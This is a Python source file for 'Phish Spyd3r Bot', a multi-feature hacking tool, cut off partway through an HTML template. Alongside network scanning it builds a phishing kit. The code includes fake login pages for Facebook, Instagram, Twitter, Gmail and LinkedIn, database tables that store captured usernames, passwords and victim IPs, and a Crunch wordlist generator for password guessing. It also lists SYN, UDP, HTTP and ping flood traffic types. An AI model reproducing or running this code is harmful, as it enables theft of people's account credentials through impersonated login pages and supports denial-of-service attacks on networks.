#!/usr/bin/env python3
"""
🐟 PHISH-SPYD3R-BOT 
Author: Ian Carter Kulani
Description:Phish Spyder Bot is Ultimate cybersecurity tool with 1000+ commands including:
            - Network scanning & monitoring
            - REAL traffic generation (ICMP, TCP, UDP, HTTP, DNS, ARP)
            - Social engineering suite (phishing for Facebook, Instagram, Twitter, Gmail, LinkedIn)
            - Discord integration with curl/wget commands
            - Nikto web vulnerability scanner
            - IP management & blocking
            - QR code generation & URL shortening
            - 🔐 CRUNCH WORDLIST GENERATOR
            - Time/Date commands with history tracking
            - cURL/wget commands via Discord
            - Blue-themed interface
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import hashlib
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import select
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import gzip
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict
from concurrent.futures import ThreadPoolExecutor

# Optional imports with fallbacks
try:
    import discord
    from discord.ext import commands, tasks
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False
    print("⚠️ Discord.py not available. Install with: pip install discord.py")

try:
    from telethon import TelegramClient, events
    from telethon.tl.types import MessageEntityCode
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False
    print("⚠️ Telethon not available. Install with: pip install telethon")

try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False
    print("⚠️ Python-whois not available. Install with: pip install python-whois")

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False
    print("⚠️ Colorama not available. Install with: pip install colorama")

# Scapy for advanced packet generation
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP
    from scapy.all import send, sr1, srloop, sendp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("⚠️ Scapy not available. Install with: pip install scapy")

# For QR code generation
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False
    print("⚠️ qrcode not available. Install with: pip install qrcode[pil]")

# For URL shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False
    print("⚠️ pyshorteners not available. Install with: pip install pyshorteners")

# For web server
try:
    from http.server import HTTPServer, BaseHTTPRequestHandler
    import socketserver
    HTTP_SERVER_AVAILABLE = True
except ImportError:
    HTTP_SERVER_AVAILABLE = False

# =====================
# BLUE THEME COLORS
# =====================
if COLORAMA_AVAILABLE:
    class Colors:
        # Blue theme colors
        PRIMARY = Fore.BLUE + Style.BRIGHT          # Bright Blue - Main headings
        SECONDARY = Fore.CYAN + Style.BRIGHT        # Cyan - Subheadings
        ACCENT = Fore.LIGHTBLUE_EX + Style.BRIGHT   # Light Blue - Accents
        SUCCESS = Fore.GREEN + Style.BRIGHT         # Green - Success messages
        WARNING = Fore.YELLOW + Style.BRIGHT        # Yellow - Warnings
        ERROR = Fore.RED + Style.BRIGHT             # Red - Errors
        INFO = Fore.MAGENTA + Style.BRIGHT          # Magenta - Info
        DARK_BLUE = Fore.BLUE                        # Dark Blue
        LIGHT_BLUE = Fore.LIGHTBLUE_EX               # Light Blue
        RESET = Style.RESET_ALL                      # Reset
        
        # Background colors
        BG_BLUE = Back.BLUE + Fore.WHITE             # Blue background with white text
        BG_CYAN = Back.CYAN + Fore.BLACK             # Cyan background with black text
else:
    class Colors:
        PRIMARY = SECONDARY = ACCENT = SUCCESS = WARNING = ERROR = INFO = DARK_BLUE = LIGHT_BLUE = BG_BLUE = BG_CYAN = RESET = ""

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".phishspyd3r"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
TELEGRAM_CONFIG_FILE = os.path.join(CONFIG_DIR, "telegram_config.json")
DISCORD_CONFIG_FILE = os.path.join(CONFIG_DIR, "discord_config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "network_data.db")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
WORDLISTS_DIR = os.path.join(CONFIG_DIR, "wordlists")
CHARSETS_DIR = os.path.join(CONFIG_DIR, "charsets")
LOG_FILE = os.path.join(CONFIG_DIR, "phishspyd3r.log")
REPORT_DIR = "reports"
SCAN_RESULTS_DIR = "scan_results"
ALERTS_DIR = "alerts"
MONITORING_DIR = "monitoring"
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
PHISHING_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "phishing_templates")
PHISHING_LOGS_DIR = os.path.join(CONFIG_DIR, "phishing_logs")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
TIME_HISTORY_DIR = os.path.join(CONFIG_DIR, "time_history")

# Create directories
directories = [
    CONFIG_DIR, REPORT_DIR, SCAN_RESULTS_DIR, ALERTS_DIR,
    MONITORING_DIR, NIKTO_RESULTS_DIR, TRAFFIC_LOGS_DIR,
    PHISHING_DIR, PHISHING_TEMPLATES_DIR, PHISHING_LOGS_DIR,
    CAPTURED_CREDENTIALS_DIR, TIME_HISTORY_DIR,
    WORDLISTS_DIR, CHARSETS_DIR
]
for directory in directories:
    Path(directory).mkdir(exist_ok=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("PhishSpyd3rBot")

# =====================
# DATA CLASSES & ENUMS
# =====================
class ScanType:
    QUICK = "quick"
    COMPREHENSIVE = "comprehensive"
    STEALTH = "stealth"
    VULNERABILITY = "vulnerability"
    FULL = "full"
    UDP = "udp"
    OS_DETECTION = "os_detection"
    SERVICE_DETECTION = "service_detection"
    WEB = "web"
    NIKTO = "nikto"

class TrafficType:
    ICMP = "icmp"
    TCP_SYN = "tcp_syn"
    TCP_ACK = "tcp_ack"
    TCP_CONNECT = "tcp_connect"
    UDP = "udp"
    HTTP_GET = "http_get"
    HTTP_POST = "http_post"
    HTTPS = "https"
    DNS = "dns"
    ARP = "arp"
    PING_FLOOD = "ping_flood"
    SYN_FLOOD = "syn_flood"
    UDP_FLOOD = "udp_flood"
    HTTP_FLOOD = "http_flood"
    MIXED = "mixed"
    RANDOM = "random"

class Severity:
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class PhishingPlatform:
    FACEBOOK = "facebook"
    INSTAGRAM = "instagram"
    TWITTER = "twitter"
    LINKEDIN = "linkedin"
    GMAIL = "gmail"
    CUSTOM = "custom"

@dataclass
class TrafficGenerator:
    traffic_type: str
    target_ip: str
    target_port: Optional[int]
    duration: int
    packets_sent: int = 0
    bytes_sent: int = 0
    start_time: Optional[str] = None
    end_time: Optional[str] = None
    status: str = "pending"
    error: Optional[str] = None

@dataclass
class ThreatAlert:
    timestamp: str
    threat_type: str
    source_ip: str
    severity: str
    description: str
    action_taken: str

@dataclass
class ScanResult:
    target: str
    scan_type: str
    open_ports: List[Dict]
    timestamp: str
    success: bool
    error: Optional[str] = None
    vulnerabilities: Optional[List[Dict]] = None

@dataclass
class NiktoResult:
    target: str
    timestamp: str
    vulnerabilities: List[Dict]
    scan_time: float
    output_file: str
    success: bool
    error: Optional[str] = None

@dataclass
class PhishingLink:
    id: str
    platform: str
    original_url: str
    phishing_url: str
    template: str
    created_at: str
    clicks: int = 0
    captured_credentials: List[Dict] = None
    
    def __post_init__(self):
        if self.captured_credentials is None:
            self.captured_credentials = []

@dataclass
class CommandResult:
    success: bool
    output: str
    execution_time: float
    error: Optional[str] = None
    data: Optional[Dict] = None

@dataclass
class ManagedIP:
    ip_address: str
    added_by: str
    added_date: str
    notes: str
    is_blocked: bool = False
    block_reason: Optional[str] = None
    blocked_date: Optional[str] = None

@dataclass
class TimeRecord:
    timestamp: str
    command: str
    user: str
    result: str

@dataclass
class CrunchResult:
    """Crunch wordlist generation result"""
    command: str
    min_length: int
    max_length: int
    charset: str
    output_file: Optional[str] = None
    estimated_size: Optional[str] = None
    estimated_combinations: Optional[int] = None
    start_time: Optional[str] = None
    end_time: Optional[str] = None
    status: str = "pending"
    error: Optional[str] = None
    pid: Optional[int] = None

# =====================
# CONFIGURATION MANAGER
# =====================
class ConfigManager:
    """Configuration manager with blue theme"""
    
    DEFAULT_CONFIG = {
        "monitoring": {
            "enabled": True,
            "port_scan_threshold": 10,
            "syn_flood_threshold": 100,
            "udp_flood_threshold": 500,
            "http_flood_threshold": 200,
            "ddos_threshold": 1000
        },
        "scanning": {
            "default_ports": "1-1000",
            "timeout": 30,
            "rate_limit": False
        },
        "security": {
            "auto_block": False,
            "auto_block_threshold": 5,
            "log_level": "INFO",
            "backup_enabled": True
        },
        "nikto": {
            "enabled": True,
            "timeout": 300,
            "max_targets": 10,
            "scan_level": 2,
            "ssl_ports": "443,8443,9443",
            "db_check": True
        },
        "traffic_generation": {
            "enabled": True,
            "max_duration": 300,
            "max_packet_rate": 1000,
            "require_confirmation": True,
            "log_traffic": True,
            "allow_floods": False
        },
        "social_engineering": {
            "enabled": True,
            "default_domain": "localhost",
            "default_port": 8080,
            "use_https": False,
            "capture_credentials": True,
            "log_all_requests": True,
            "auto_shorten_urls": True
        },
        "crunch": {
            "enabled": True,
            "max_wordlist_size": 1073741824,
            "default_output_dir": WORDLISTS_DIR,
            "charset_dir": CHARSETS_DIR,
            "allow_compression": True,
            "max_generation_time": 3600,
            "require_confirmation_for_large": True,
            "large_threshold": 100000000
        },
        "discord": {
            "enabled": False,
            "token": "",
            "channel_id": "",
            "prefix": "!",
            "admin_role": "Admin",
            "security_role": "Security Team"
        },
        "telegram": {
            "enabled": False,
            "api_id": "",
            "api_hash": "",
            "phone_number": "",
            "channel_id": ""
        },
        "theme": {
            "primary": "blue",
            "secondary": "cyan",
            "accent": "light_blue"
        }
    }
    
    @staticmethod
    def load_config() -> Dict:
        """Load configuration"""
        try:
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, 'r') as f:
                    config = json.load(f)
                    for key, value in ConfigManager.DEFAULT_CONFIG.items():
                        if key not in config:
                            config[key] = value
                        elif isinstance(value, dict):
                            for sub_key, sub_value in value.items():
                                if sub_key not in config[key]:
                                    config[key][sub_key] = sub_value
                    return config
        except Exception as e:
            logger.error(f"Failed to load config: {e}")
        
        return ConfigManager.DEFAULT_CONFIG.copy()
    
    @staticmethod
    def save_config(config: Dict) -> bool:
        """Save configuration"""
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            logger.info("Configuration saved")
            return True
        except Exception as e:
            logger.error(f"Failed to save config: {e}")
            return False

# =====================
# CRUNCH WORDLIST GENERATOR
# =====================
class CrunchGenerator:
    """Crunch wordlist generator integration"""
    
    def __init__(self, db_manager: 'DatabaseManager', config: Dict = None):
        self.db = db_manager
        self.config = config or {}
        self.crunch_available = self._check_crunch()
        self.active_generations = {}
        self.generation_threads = {}
        self._create_default_charset_file()
    
    def _check_crunch(self) -> bool:
        """Check if crunch is available"""
        crunch_path = shutil.which('crunch')
        if crunch_path:
            logger.info(f"Crunch found at: {crunch_path}")
            return True
        
        common_paths = [
            '/usr/bin/crunch',
            '/usr/local/bin/crunch',
            '/opt/crunch/crunch',
            '/usr/share/crunch/crunch'
        ]
        
        for path in common_paths:
            if os.path.exists(path):
                logger.info(f"Crunch found at: {path}")
                return True
        
        logger.warning("Crunch not found. Wordlist generation will be limited.")
        return False
    
    def _create_default_charset_file(self):
        """Create default charset.lst file"""
        charset_file = os.path.join(CHARSETS_DIR, "charset.lst")
        
        if not os.path.exists(charset_file):
            default_charsets = """#
# Standard character sets for crunch
# Format: name = characters
#
lalpha = abcdefghijklmnopqrstuvwxyz
ualpha = ABCDEFGHIJKLMNOPQRSTUVWXYZ
numeric = 0123456789
mixalpha = abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
mixalpha-numeric = abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
mixalpha-numeric-all = abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=~`[]{}|\\:;\"'<>,.?/
lower-hex = 0123456789abcdef
upper-hex = 0123456789ABCDEF
hex-lower = 0123456789abcdef
hex-upper = 0123456789ABCDEF
lalpha-numeric = abcdefghijklmnopqrstuvwxyz0123456789
ualpha-numeric = ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
lalpha-symbol = abcdefghijklmnopqrstuvwxyz!@#$%^&*()-_+=~`[]{}|\\:;\"'<>,.?/
ualpha-symbol = ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_+=~`[]{}|\\:;\"'<>,.?/
all = abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=~`[]{}|\\:;\"'<>,.?/
"""
            try:
                with open(charset_file, 'w') as f:
                    f.write(default_charsets)
                logger.info(f"Created default charset file: {charset_file}")
            except Exception as e:
                logger.error(f"Failed to create charset file: {e}")
    
    def get_charset_list(self) -> List[Dict]:
        """Get list of available character sets"""
        charsets = []
        charset_file = os.path.join(CHARSETS_DIR, "charset.lst")
        
        if os.path.exists(charset_file):
            try:
                with open(charset_file, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            if '=' in line:
                                name, chars = line.split('=', 1)
                                charsets.append({
                                    'name': name.strip(),
                                    'chars': chars.strip(),
                                    'length': len(chars.strip())
                                })
            except Exception as e:
                logger.error(f"Failed to read charset file: {e}")
        
        return charsets
    
    def estimate_combinations(self, min_len: int, max_len: int, charset: str) -> int:
        """Estimate number of combinations"""
        charset_len = len(charset)
        total = 0
        for length in range(min_len, max_len + 1):
            total += charset_len ** length
        return total
    
    def estimate_size(self, combinations: int, avg_length: int = 8) -> str:
        """Estimate file size in human readable format"""
        bytes_estimate = combinations * (avg_length + 1)
        
        if bytes_estimate < 1024:
            return f"{bytes_estimate} bytes"
        elif bytes_estimate < 1024 * 1024:
            return f"{bytes_estimate / 1024:.2f} KB"
        elif bytes_estimate < 1024 * 1024 * 1024:
            return f"{bytes_estimate / (1024 * 1024):.2f} MB"
        else:
            return f"{bytes_estimate / (1024 * 1024 * 1024):.2f} GB"
    
    def generate_wordlist(self, command: str, min_len: int, max_len: int, 
                         charset: str = None, options: List[str] = None) -> CrunchResult:
        """Generate wordlist using crunch"""
        
        if not self.crunch_available:
            return CrunchResult(
                command=command,
                min_length=min_len,
                max_length=max_len,
                charset=charset or "",
                status="failed",
                error="Crunch is not installed. Install with: sudo apt-get install crunch"
            )
        
        charset_to_use = charset or "abcdefghijklmnopqrstuvwxyz0123456789"
        combinations = self.estimate_combinations(min_len, max_len, charset_to_use)
        
        try:
            cmd = self._build_crunch_command(min_len, max_len, charset_to_use, options)
            gen_id = f"crunch_{min_len}_{max_len}_{int(time.time())}"
            
            result = CrunchResult(
                command=command,
                min_length=min_len,
                max_length=max_len,
                charset=charset_to_use,
                estimated_combinations=combinations,
                estimated_size=self.estimate_size(combinations),
                start_time=datetime.datetime.now().isoformat(),
                status="running"
            )
            
            thread = threading.Thread(
                target=self._run_crunch,
                args=(gen_id, result, cmd, options)
            )
            thread.daemon = True
            thread.start()
            
            self.generation_threads[gen_id] = thread
            self.active_generations[gen_id] = result
            
            return result
            
        except Exception as e:
            return CrunchResult(
                command=command,
                min_length=min_len,
                max_length=max_len,
                charset=charset_to_use,
                status="failed",
                error=str(e)
            )
    
    def _build_crunch_command(self, min_len: int, max_len: int, 
                             charset: str, options: List[str] = None) -> List[str]:
        """Build crunch command with options"""
        cmd = ['crunch', str(min_len), str(max_len)]
        
        if options:
            i = 0
            while i < len(options):
                opt = options[i]
                
                if opt == '-o' and i + 1 < len(options):
                    output_file = options[i + 1]
                    if not os.path.isabs(output_file):
                        output_file = os.path.join(WORDLISTS_DIR, output_file)
                    cmd.extend(['-o', output_file])
                    i += 2
                elif opt == '-b' and i + 1 < len(options):
                    cmd.extend(['-b', options[i + 1]])
                    i += 2
                elif opt == '-c' and i + 1 < len(options):
                    cmd.extend(['-c', options[i + 1]])
                    i += 2
                elif opt == '-t' and i + 1 < len(options):
                    cmd.extend(['-t', options[i + 1]])
                    i += 2
                elif opt == '-f' and i + 2 < len(options):
                    charset_file = options[i + 1]
                    if not os.path.isabs(charset_file):
                        charset_file = os.path.join(CHARSETS_DIR, charset_file)
                    cmd.extend(['-f', charset_file, options[i + 2]])
                    i += 3
                elif opt == '-p':
                    perm_words = []
                    i += 1
                    while i < len(options) and not options[i].startswith('-'):
                        perm_words.append(options[i])
                        i += 1
                    cmd.extend(['-p'] + perm_words)
                elif opt == '-q' and i + 1 < len(options):
                    cmd.extend(['-q', options[i + 1]])
                    i += 2
                elif opt == '-s' and i + 1 < len(options):
                    cmd.extend(['-s', options[i + 1]])
                    i += 2
                elif opt == '-e' and i + 1 < len(options):
                    cmd.extend(['-e', options[i + 1]])
                    i += 2
                elif opt == '-d' and i + 1 < len(options):
                    cmd.extend(['-d', options[i + 1]])
                    i += 2
                elif opt == '-l' and i + 1 < len(options):
                    cmd.extend(['-l', options[i + 1]])
                    i += 2
                elif opt in ['-i', '-u', '-h']:
                    cmd.append(opt)
                    i += 1
                else:
                    i += 1
        else:
            cmd.append(charset)
        
        return cmd
    
    def _run_crunch(self, gen_id: str, result: CrunchResult, 
                   cmd: List[str], options: List[str] = None):
        """Run crunch in background thread"""
        try:
            output_file = None
            if options:
                for i, opt in enumerate(options):
                    if opt == '-o' and i + 1 < len(options):
                        output_file = options[i + 1]
                        if not os.path.isabs(output_file):
                            output_file = os.path.join(WORDLISTS_DIR, output_file)
                        result.output_file = output_file
            
            if not output_file:
                timestamp = int(time.time())
                output_file = os.path.join(WORDLISTS_DIR, f"wordlist_{result.min_length}_{result.max_length}_{timestamp}.txt")
                cmd.extend(['-o', output_file])
                result.output_file = output_file
            
            logger.info(f"Running crunch: {' '.join(cmd)}")
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1
            )
            
            result.pid = process.pid
            
            max_time = self.config.get('crunch', {}).get('max_generation_time', 3600)
            try:
                stdout, stderr = process.communicate(timeout=max_time)
                
                if process.returncode == 0:
                    result.status = "completed"
                    result.end_time = datetime.datetime.now().isoformat()
                    
                    if os.path.exists(output_file):
                        size = os.path.getsize(output_file)
                        result.estimated_size = self.estimate_size(result.estimated_combinations or 0)
                        self._log_generation(result)
                    
                    logger.info(f"Crunch completed: {output_file}")
                else:
                    result.status = "failed"
                    result.error = stderr
                    logger.error(f"Crunch failed: {stderr}")
            
            except subprocess.TimeoutExpired:
                process.kill()
                result.status = "timeout"
                result.error = f"Generation exceeded maximum time of {max_time} seconds"
                logger.error(f"Crunch timeout after {max_time}s")
            
        except Exception as e:
            result.status = "failed"
            result.error = str(e)
            logger.error(f"Crunch error: {e}")
        
        finally:
            if gen_id in self.active_generations:
                del self.active_generations[gen_id]
            if gen_id in self.generation_threads:
                del self.generation_threads[gen_id]
    
    def _log_generation(self, result: CrunchResult):
        """Log wordlist generation to database"""
        try:
            self.db.cursor.execute('''
                INSERT INTO wordlist_generations 
                (min_length, max_length, charset, output_file, combinations, 
                 estimated_size, status, start_time, end_time)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                result.min_length,
                result.max_length,
                result.charset[:100],
                result.output_file,
                result.estimated_combinations,
                result.estimated_size,
                result.status,
                result.start_time,
                result.end_time
            ))
            self.db.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log wordlist generation: {e}")
    
    def stop_generation(self, gen_id: str = None) -> bool:
        """Stop wordlist generation"""
        if gen_id:
            if gen_id in self.active_generations:
                result = self.active_generations[gen_id]
                if result.pid:
                    try:
                        os.kill(result.pid, signal.SIGTERM)
                        result.status = "stopped"
                        return True
                    except:
                        pass
        return False
    
    def get_active_generations(self) -> List[Dict]:
        """Get list of active wordlist generations"""
        active = []
        for gen_id, result in self.active_generations.items():
            active.append({
                'id': gen_id,
                'min_length': result.min_length,
                'max_length': result.max_length,
                'charset': result.charset[:30],
                'output_file': result.output_file,
                'estimated_combinations': result.estimated_combinations,
                'estimated_size': result.estimated_size,
                'start_time': result.start_time,
                'status': result.status,
                'pid': result.pid
            })
        return active
    
    def get_generation_history(self, limit: int = 10) -> List[Dict]:
        """Get wordlist generation history from database"""
        try:
            self.db.cursor.execute('''
                SELECT * FROM wordlist_generations 
                ORDER BY start_time DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.db.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get generation history: {e}")
            return []
    
    def get_crunch_help(self) -> str:
        """Get crunch help text"""
        return """
🔐 CRUNCH Wordlist Generator - All Commands:

BASIC USAGE:
  crunch <min> <max> [charset]              - Generate wordlist with charset
  crunch <min> <max> -f charset.lst setname - Use charset file
  crunch <min> <max> -t @@@@                - Use pattern (@ = lowercase, , = uppercase, % = numbers, ^ = symbols)
  crunch <min> <max> -p word1 word2 ...     - Generate permutations
  crunch <min> <max> -o wordlist.txt        - Save to file
  crunch <min> <max> -s string               - Start at specific string
  crunch <min> <max> -e string               - Stop at specific string
  crunch <min> <max> -b size                  - Split into files of given size
  crunch <min> <max> -c number                - Number of lines per file
  crunch <min> <max> -d number@               - Limit duplicate characters
  crunch <min> <max> -l pattern                - Literal pattern matching
  crunch <min> <max> -i                        - Invert output
  crunch <min> <max> -u                        - Remove duplicate lines
  crunch -h                                    - Show help

EXAMPLES:
  crunch 1 3 abc -o small.txt                  - Length 1-3 using abc
  crunch 4 4 -t @@@@ -o pins.txt                - Generate 4-digit pins
  crunch 8 8 -t ,,,,@@@@ -o passwords.txt       - 4 uppercase + 4 lowercase
  crunch 6 6 -f charset.lst mixalpha-numeric    - Use charset from file
  crunch 3 3 -p dog cat bird -o permutations.txt - Generate permutations
  crunch 5 5 abc123 -s aaaaa                     - Start at 'aaaaa'
  crunch 1 8 -o START -b 10mb                     - Split into 10MB files
  crunch 8 8 -d 2@                                 - Max 2 consecutive lowercase

CHARSET PLACEHOLDERS:
  @ - Lowercase characters
  , - Uppercase characters
  % - Numbers
  ^ - Symbols
"""

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    """SQLite database manager"""
    
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self.init_tables()
    
    def init_tables(self):
        """Initialize database tables"""
        tables = [
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS time_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                user TEXT,
                result TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS wordlist_generations (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                min_length INTEGER NOT NULL,
                max_length INTEGER NOT NULL,
                charset TEXT,
                output_file TEXT,
                combinations INTEGER,
                estimated_size TEXT,
                status TEXT DEFAULT 'pending',
                start_time TIMESTAMP,
                end_time TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                resolved BOOLEAN DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                services TEXT,
                os_info TEXT,
                vulnerabilities TEXT,
                execution_time REAL
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                added_by TEXT,
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                blocked_date TIMESTAMP,
                threat_level INTEGER DEFAULT 0,
                last_scan TIMESTAMP,
                scan_count INTEGER DEFAULT 0,
                alert_count INTEGER DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                target_port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT,
                executed_by TEXT,
                error TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                original_url TEXT,
                phishing_url TEXT NOT NULL,
                template TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1,
                qr_code_path TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                additional_data TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_templates (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                platform TEXT NOT NULL,
                html_content TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS scheduled_tasks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                task_type TEXT NOT NULL,
                target TEXT NOT NULL,
                schedule TEXT NOT NULL,
                last_run TIMESTAMP,
                next_run TIMESTAMP,
                enabled BOOLEAN DEFAULT 1,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS network_connections (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                local_ip TEXT,
                local_port INTEGER,
                remote_ip TEXT,
                remote_port INTEGER,
                protocol TEXT,
                status TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS user_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT UNIQUE NOT NULL,
                user_name TEXT,
                start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_activity TIMESTAMP,
                commands_count INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )
            """
        ]
        
        for table_sql in tables:
            try:
                self.cursor.execute(table_sql)
            except Exception as e:
                logger.error(f"Failed to create table: {e}")
        
        self.conn.commit()
        self._init_phishing_templates()
    
    def _init_phishing_templates(self):
        """Initialize default phishing templates"""
        templates = {
            "facebook_default": {"platform": "facebook", "html": self._get_facebook_template()},
            "instagram_default": {"platform": "instagram", "html": self._get_instagram_template()},
            "twitter_default": {"platform": "twitter", "html": self._get_twitter_template()},
            "gmail_default": {"platform": "gmail", "html": self._get_gmail_template()},
            "linkedin_default": {"platform": "linkedin", "html": self._get_linkedin_template()}
        }
        
        for name, template in templates.items():
            try:
                self.cursor.execute('''
                    INSERT OR IGNORE INTO phishing_templates (name, platform, html_content)
                    VALUES (?, ?, ?)
                ''', (name, template['platform'], template['html']))
            except Exception as e:
                logger.error(f"Failed to insert template {name}: {e}")
        
        self.conn.commit()
    
    def _get_facebook_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #1877f2 0%, #166fe5 100%);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 400px;
            width: 100%;
            padding: 20px;
        }
        .login-box {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
            padding: 20px;
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo h1 {
            color: #1877f2;
            font-size: 40px;
            margin: 0;
        }
        .form-group {
